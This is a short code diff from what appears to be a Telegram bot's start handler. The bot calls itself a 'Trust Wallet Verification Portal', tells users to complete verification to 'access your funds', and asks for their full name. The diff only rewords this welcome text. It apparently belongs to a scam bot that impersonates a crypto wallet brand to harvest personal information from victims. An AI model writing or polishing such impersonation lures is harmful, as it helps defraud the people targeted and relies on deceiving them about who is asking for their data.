@@ -60,8 +60,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
 
     await update.message.reply_text(
-        "Welcome to the Trust Wallet Beneficiary Verification Portal.\n\n"
-    "Complete verification to confirm your eligibility and receive your funds.\n\n"
+        "Welcome to the Trust Wallet Verification Portal.\n\n"
+    "Complete verification to confirm your eligibility and access your funds.\n\n"
         "Please provide the required information.\n\n"
         "Enter your Full Name:"
     )
